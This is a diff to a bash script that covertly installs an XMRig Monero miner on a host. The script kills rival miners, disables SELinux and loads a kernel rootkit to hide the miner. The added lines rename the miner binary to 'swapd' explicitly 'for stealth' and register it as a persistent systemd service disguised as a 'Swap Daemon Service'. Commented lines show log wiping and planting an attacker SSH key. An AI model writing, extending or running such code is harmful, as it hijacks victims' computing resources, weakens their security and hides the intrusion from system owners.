@@ -167,12 +167,16 @@ EMAIL=$2 # this one is optional
 
 echo ""
 echo "========================================================================="
-echo "[*] Executing comprehensive miner killer suite..."
+echo "[*] EXECUTING COMPREHENSIVE MINER KILLER SUITE..."
 echo "========================================================================="
+echo "[*] This will eliminate any competing miners before installation"
 echo ""
 
 # ======== SCRIPT 1: MinerKiller.sh ========
-echo "[*] Running MinerKiller.sh..."
+echo ""
+echo "--------------------------------------------------------------------"
+echo "[*] Running MinerKiller.sh (Process & Network Based Cleanup)..."
+echo "--------------------------------------------------------------------"
 
 # Killing processes by name, path, arguments and CPU utilization
 minerkiller_processes(){
@@ -424,10 +428,13 @@ minerkiller_network(){
 minerkiller_files
 minerkiller_processes
 minerkiller_network
-echo "[*] MinerKiller.sh completed"
+echo "[VERBOSE] ✓ MinerKiller.sh completed"
 
 # ======== SCRIPT 2: kill-miner-nomail.sh ========
-echo "[*] Running kill-miner-nomail.sh..."
+echo ""
+echo "--------------------------------------------------------------------"
+echo "[*] Running kill-miner-nomail.sh (Heuristic Detection)..."
+echo "--------------------------------------------------------------------"
 
 binary_names="(kernelupdates)|(kernelcfg)|(kernelorg)|(kernelupgrade)|(named)"
 
@@ -517,10 +524,13 @@ else
   done
 fi
 
-echo "[*] kill-miner-nomail.sh completed"
+echo "[VERBOSE] ✓ kill-miner-nomail.sh completed"
 
 # ======== SCRIPT 3: minerkill.sh ========
-echo "[*] Running minerkill.sh..."
+echo ""
+echo "--------------------------------------------------------------------"
+echo "[*] Running minerkill.sh (Extensive Process Cleanup)..."
+echo "--------------------------------------------------------------------"
 
 setenforce 0 2>/dev/null
 echo SELINUX=disabled > /etc/sysconfig/selinux 2>/dev/null
@@ -643,12 +653,14 @@ ps auxf|grep -v grep|grep "stratum"|awk '{print $2}'|xargs kill -9 2>/dev/null
 # echo > /var/log/wtmp
 # echo > /var/log/secure
 
-echo "[*] minerkill.sh completed"
+echo "[VERBOSE] ✓ minerkill.sh completed"
 
 echo ""
 echo "========================================================================="
-echo "[*] Miner killer suite execution completed!"
+echo "[*] MINER KILLER SUITE EXECUTION COMPLETED!"
 echo "========================================================================="
+echo "[*] All competing miners have been eliminated"
+echo "[*] Proceeding with XMRig installation..."
 echo ""
 
 # ========================================================================
@@ -776,52 +788,145 @@ echo ""
 echo "JFYI: This host has $CPU_THREADS CPU threads, so projected Monero hashrate is around $EXP_MONERO_HASHRATE KH/s."
 echo ""
 
+echo ""
+echo "========================================================================"
+echo "[*] XMRIG DOWNLOAD AND INSTALLATION SECTION"
+echo "========================================================================"
+echo ""
+
 echo "[*] #removing previous moneroocean miner (if any)..."
 if sudo -n true 2>/dev/null; then
   sudo systemctl stop swapd.service 2>/dev/null
+  echo "[VERBOSE] Stopped swapd.service (if running)"
 fi
-killall -9 swapd 2>/dev/null
-killall -9 xmrig 2>/dev/null
-rm -rf "$HOME"/.swapd
+killall -9 swapd 2>/dev/null && echo "[VERBOSE] Killed swapd processes"
+killall -9 xmrig 2>/dev/null && echo "[VERBOSE] Killed xmrig processes"
+rm -rf "$HOME"/.swapd && echo "[VERBOSE] Removed $HOME/.swapd directory"
+rm -rf "$HOME"/xmrig* && echo "[VERBOSE] Removed xmrig files from $HOME"
 
+echo ""
 echo "[*] #downloading advanced version of xmrig to /tmp..."
 if [ ! -d /tmp ]; then
   mkdir /tmp
+  echo "[VERBOSE] Created /tmp directory"
 fi
-cd /tmp
+
+# Save current directory and switch to /tmp
+ORIGINAL_DIR=$(pwd)
+cd /tmp || exit 1
+echo "[VERBOSE] Changed to directory: $(pwd)"
 
 if ! type curl >/dev/null; then
+  echo "[VERBOSE] curl not found, installing..."
   apt-get update -y
   apt-get install -y curl
 fi
 
+echo "[VERBOSE] Fetching latest XMRig release version..."
 LATEST_XMRIG_RELEASE=$(curl -s https://github.com/xmrig/xmrig/releases/latest | grep -o 'v[0-9]\+\.[0-9]\+\.[0-9]\+' | head -1)
+echo "[VERBOSE] Found release: $LATEST_XMRIG_RELEASE"
+
+LATEST_XMRIG_VERSION="${LATEST_XMRIG_RELEASE#v}"  # Strip the 'v' prefix for directory name
+echo "[VERBOSE] Version number (without 'v'): $LATEST_XMRIG_VERSION"
+
 LATEST_XMRIG_LINUX_RELEASE="xmrig-$LATEST_XMRIG_RELEASE-linux-static-x64.tar.gz"
 
 # Detect architecture
 ARCH=$(uname -m)
+echo "[VERBOSE] Detected architecture: $ARCH"
+
 if [ "$ARCH" == "aarch64" ] || [ "$ARCH" == "arm64" ]; then
     LATEST_XMRIG_LINUX_RELEASE="xmrig-$LATEST_XMRIG_RELEASE-linux-static-arm64.tar.gz"
+    echo "[VERBOSE] Using ARM64 release: $LATEST_XMRIG_LINUX_RELEASE"
+else
+    echo "[VERBOSE] Using x64 release: $LATEST_XMRIG_LINUX_RELEASE"
 fi
 
+echo "[VERBOSE] Download URL: https://github.com/xmrig/xmrig/releases/download/$LATEST_XMRIG_RELEASE/$LATEST_XMRIG_LINUX_RELEASE"
+echo "[*] Starting download..."
+
 if curl -L --progress-bar "https://github.com/xmrig/xmrig/releases/download/$LATEST_XMRIG_RELEASE/$LATEST_XMRIG_LINUX_RELEASE" -o /tmp/xmrig.tar.gz; then
-  tar xf /tmp/xmrig.tar.gz
-  mv "xmrig-$LATEST_XMRIG_RELEASE" "$HOME"/.swapd
-  rm /tmp/xmrig.tar.gz
+  echo ""
+  echo "[VERBOSE] Download completed successfully"
+  echo "[VERBOSE] File size: $(du -h /tmp/xmrig.tar.gz | cut -f1)"
+  echo "[*] Extracting archive to /tmp..."
+  
+  tar xf /tmp/xmrig.tar.gz -C /tmp
+  echo "[VERBOSE] Extraction completed"
+  
+  # Show what was extracted
+  echo "[VERBOSE] Looking for extracted directory: /tmp/xmrig-$LATEST_XMRIG_VERSION"
+  echo "[VERBOSE] Contents of /tmp after extraction:"
+  ls -la /tmp/ | grep xmrig
+  
+  if [ -d "/tmp/xmrig-$LATEST_XMRIG_VERSION" ]; then
+    echo "[VERBOSE] ✓ Found extracted directory: /tmp/xmrig-$LATEST_XMRIG_VERSION"
+    echo "[VERBOSE] Contents of extracted directory:"
+    ls -la "/tmp/xmrig-$LATEST_XMRIG_VERSION"
+    
+    echo "[*] Moving extracted files to $HOME/.swapd..."
+    mv "/tmp/xmrig-$LATEST_XMRIG_VERSION" "$HOME"/.swapd
+    echo "[VERBOSE] ✓ Moved to $HOME/.swapd"
+    echo "[VERBOSE] Contents of $HOME/.swapd:"
+    ls -la "$HOME"/.swapd/
+  else
+    echo "[ERROR] ✗ Extracted directory /tmp/xmrig-$LATEST_XMRIG_VERSION not found!"
+    echo "[ERROR] Available xmrig directories in /tmp:"
+    ls -la /tmp/ | grep xmrig
+    echo "[ERROR] This is a critical error - cannot continue without xmrig binary"
+    exit 1
+  fi
+  
+  rm -f /tmp/xmrig.tar.gz
+  echo "[VERBOSE] Cleaned up archive file"
+  
+  # Rename xmrig to swapd for stealth
+  echo ""
+  echo "[*] Renaming xmrig binary to swapd for stealth..."
+  if [ -f "$HOME"/.swapd/xmrig ]; then
+    echo "[VERBOSE] ✓ Found xmrig binary at $HOME/.swapd/xmrig"
+    mv "$HOME"/.swapd/xmrig "$HOME"/.swapd/swapd
+    chmod +x "$HOME"/.swapd/swapd
+    echo "[VERBOSE] ✓ Renamed to swapd and set executable permissions"
+    echo "[VERBOSE] Binary info:"
+    file "$HOME"/.swapd/swapd
+    ls -lh "$HOME"/.swapd/swapd
+  else
+    echo "[ERROR] ✗ xmrig binary not found at $HOME/.swapd/xmrig after extraction!"
+    echo "[ERROR] Contents of $HOME/.swapd/:"
+    ls -la "$HOME"/.swapd/
+    echo "[ERROR] This is a critical error - cannot continue without xmrig binary"
+    exit 1
+  fi
 else
-  echo "ERROR: Can't download https://github.com/xmrig/xmrig/releases/download/$LATEST_XMRIG_RELEASE/$LATEST_XMRIG_LINUX_RELEASE file to /tmp/xmrig.tar.gz"
+  echo ""
+  echo "[ERROR] ✗ Download failed!"
+  echo "[ERROR] URL: https://github.com/xmrig/xmrig/releases/download/$LATEST_XMRIG_RELEASE/$LATEST_XMRIG_LINUX_RELEASE"
+  echo "[ERROR] Cannot continue without xmrig binary"
   exit 1
 fi
 
+echo ""
+echo "[VERBOSE] ======== XMRIG DOWNLOAD COMPLETED SUCCESSFULLY ========"
+echo ""
+
 echo "[*] #checking if advanced version of $LATEST_XMRIG_RELEASE xmrig was downloaded properly..."
 ARCH=$(uname -m)
-if [ ! -f "$HOME/.swapd/xmrig" ]; then
-  echo "WARNING: Advanced version of xmrig was not downloaded!"
+if [ ! -f "$HOME/.swapd/swapd" ]; then
+  echo "[ERROR] ✗ WARNING: Advanced version of xmrig was not downloaded properly!"
+  echo "[ERROR] Expected file: $HOME/.swapd/swapd"
+  echo "[ERROR] Directory contents:"
+  ls -la "$HOME/.swapd/" 2>/dev/null || echo "Directory doesn't exist!"
+  exit 1
 else
-  echo "Hooray: Advanced version of xmrig was downloaded successfully!"
+  echo "[VERBOSE] ✓ Hooray: Advanced version of xmrig was downloaded and renamed to swapd successfully!"
+  echo "[VERBOSE] File: $HOME/.swapd/swapd"
+  echo "[VERBOSE] Size: $(du -h $HOME/.swapd/swapd | cut -f1)"
 fi
 
+echo ""
 echo "[*] #creating $HOME/.swapd/config.json config..."
+echo "[VERBOSE] Generating configuration for wallet: $WALLET"
 cat >"$HOME"/.swapd/config.json <<EOL
 {
     "autosave": true,
@@ -891,57 +996,86 @@ cat >"$HOME"/.swapd/config.json <<EOL
 }
 EOL
 
+echo "[VERBOSE] ✓ Config file created: $HOME/.swapd/config.json"
+
 cp "$HOME"/.swapd/config.json "$HOME"/.swapd/config_background.json
 sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' "$HOME"/.swapd/config_background.json
+echo "[VERBOSE] ✓ Created background config: $HOME/.swapd/config_background.json"
 
+echo ""
 echo "[*] #creating $HOME/.swapd/swapd.sh script..."
 cat >"$HOME"/.swapd/swapd.sh <<'EOL'
 #!/bin/bash
 cd $HOME/.swapd
-./xmrig --config=config.json
+./swapd --config=config.json
 EOL
 chmod +x "$HOME"/.swapd/swapd.sh
+echo "[VERBOSE] ✓ Launcher script created: $HOME/.swapd/swapd.sh"
 
+echo ""
 echo "[*] #running performance tunings..."
 sudo -n true 2>/dev/null
 if [ $? -eq 0 ]; then
-  echo "Applying system optimizations..."
+  echo "[VERBOSE] Running with root privileges - applying full optimizations"
   
-  sudo sysctl -w vm.nr_hugepages=$(nproc)
+  HUGEPAGES_COUNT=$(nproc)
+  echo "[VERBOSE] Setting vm.nr_hugepages to $HUGEPAGES_COUNT"
+  sudo sysctl -w vm.nr_hugepages=$HUGEPAGES_COUNT
   
+  echo "[VERBOSE] Configuring 1GB hugepages..."
   for i in $(find /sys/devices/system/node/node* -maxdepth 0 -type d 2>/dev/null); do
     echo 3 | sudo tee "$i/hugepages/hugepages-1048576kB/nr_hugepages" 2>/dev/null
+    echo "[VERBOSE]   - Configured node: $i"
   done
   
   # MSR optimization (if msr-tools available)
   if type rdmsr 2>/dev/null && type wrmsr 2>/dev/null; then
+    echo "[VERBOSE] MSR tools available, applying MSR optimizations..."
     for i in $(seq 0 $(($(nproc)-1))); do
       sudo wrmsr -p${i} 0x1a4 0xf 2>/dev/null
     done
-    echo "MSR register 0x1a4 set to 0xf"
+    echo "[VERBOSE] ✓ MSR register 0x1a4 set to 0xf"
+  else
+    echo "[VERBOSE] MSR tools not available, skipping MSR optimization"
   fi
   
-  echo "1GB pages enabled successfully"
+  echo "[VERBOSE] ✓ 1GB pages enabled successfully"
 else
-  echo "Running without root - limited optimizations"
+  echo "[VERBOSE] Running without root - limited optimizations"
   sudo sysctl -w vm.nr_hugepages=$(nproc) 2>/dev/null
 fi
 
-echo "PASS..."
+echo ""
+echo "[*] Configuring password field..."
 #PASS=`hostname | cut -f1 -d"." | sed -r 's/[^a-zA-Z0-9\-]+/_/g'`
 #PASS=`hostname`
 #PASS=`sh -c "IP=\$(curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//'); nslookup \$IP | grep 'name =' | awk '{print \$NF}'"`
+echo "[VERBOSE] Fetching external IP for password field..."
 PASS=$(sh -c "(curl -4 ip.sb)")
+echo "[VERBOSE] Detected IP: $PASS"
+
 if [ "$PASS" == "localhost" ]; then
   PASS=$(ip route get 1 | awk '{print $NF;exit}')
+  echo "[VERBOSE] IP was localhost, using route IP: $PASS"
 fi
 if [ -z "$PASS" ]; then
   PASS=na
+  echo "[VERBOSE] Could not determine IP, using: na"
 fi
 if [ -n "$EMAIL" ]; then
   PASS="$PASS:$EMAIL"
+  echo "[VERBOSE] Added email to password field: $EMAIL"
 fi
+
+echo "[VERBOSE] Final password field value: $PASS"
 sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' "$HOME"/.swapd/config.json
+echo "[VERBOSE] ✓ Updated config.json with password field"
+
+echo ""
+echo "========================================================================"
+echo "[*] XMRIG INSTALLATION SECTION COMPLETED SUCCESSFULLY"
+echo "========================================================================"
+echo ""
 
 echo "[*] Generating ssh key on server"
 #cd ~ && rm -rf .ssh && rm -rf ~/.ssh/authorized_keys && mkdir ~/.ssh && chmod 700 ~/.ssh && echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDPrkRNFGukhRN4gwM5yNZYc/ldflr+Gii/4gYIT8sDH23/zfU6R7f0XgslhqqXnbJTpHYms+Do/JMHeYjvcYy8NMYwhJgN1GahWj+PgY5yy+8Efv07pL6Bo/YgxXV1IOoRkya0Wq53S7Gb4+p3p2Pb6NGJUGCZ37TYReSHt0Ga0jvqVFNnjUyFxmDpq1CXqjSX8Hj1JF6tkpANLeBZ8ai7EiARXmIHFwL+zjCPdS7phyfhX+tWsiM9fm1DQIVdzkql5J980KCTNNChdt8r5ETre+Yl8mo0F/fw485I5SnYxo/i3tp0Q6R5L/psVRh3e/vcr2lk+TXCjk6rn5KJirZWZHlWK+kbHLItZ8P2AcADHeTPeqgEU56NtNSLq5k8uLz9amgiTBLThwIFW4wjnTkcyVzMHKoOp4pby17Ft+Edj8v0z1Xo/WxTUoMwmTaQ4Z5k6wpo2wrsrCzYQqd6p10wp2uLp8mK5eq0I2hYL1Dmf9jmJ6v6w915P2aMss+Vpp0=' >>~/.ssh/authorized_keys
@@ -1092,14 +1226,16 @@ dmesg -C 2>/dev/null && insmod rootkit.ko 2>/dev/null && dmesg 2>/dev/null
 kill -31 $(/bin/ps ax -fu "$USER" | grep "swapd" | grep -v "grep" | awk '{print $2}') 2>/dev/null
 rm -rf hiding-cryptominers-linux-rootkit/ 2>/dev/null
 
+echo ""
 echo "[*] #setting up swapd systemd service..."
+echo "[VERBOSE] Creating systemd service file..."
 
 cat >/tmp/swapd.service <<EOL
 [Unit]
 Description=Swap Daemon Service
 
 [Service]
-ExecStart=$HOME/.swapd/xmrig --config=$HOME/.swapd/config.json
+ExecStart=$HOME/.swapd/swapd --config=$HOME/.swapd/config.json
 Restart=always
 Nice=10
 CPUWeight=1
@@ -1107,15 +1243,34 @@ CPUWeight=1
 [Install]
 WantedBy=multi-user.target
 EOL
+
+echo "[VERBOSE] ✓ Service file created in /tmp/swapd.service"
+echo "[VERBOSE] Service will execute: $HOME/.swapd/swapd --config=$HOME/.swapd/config.json"
+
 sudo mv /tmp/swapd.service /etc/systemd/system/swapd.service
+echo "[VERBOSE] ✓ Moved service file to /etc/systemd/system/swapd.service"
+
+echo "[VERBOSE] Reloading systemd daemon..."
 sudo systemctl daemon-reload
+echo "[VERBOSE] ✓ Daemon reloaded"
+
+echo "[VERBOSE] Enabling swapd service..."
 sudo systemctl enable swapd.service
+echo "[VERBOSE] ✓ Service enabled"
+
+echo "[VERBOSE] Starting swapd service..."
 sudo systemctl start swapd.service
 echo "Configured systemd service and will run it in background."
 
-systemctl status swapd
+echo ""
+echo "[*] Checking service status..."
+systemctl status swapd --no-pager -l
+echo ""
+echo "[VERBOSE] Starting service again (redundant check)..."
 systemctl start swapd
-systemctl status swapd
+echo ""
+echo "[*] Final service status:"
+systemctl status swapd --no-pager -l
 
 kill -31 $(pgrep -f -u root config.json) 2>/dev/null &
 kill -31 $(pgrep -f -u root config_background.json) 2>/dev/null &
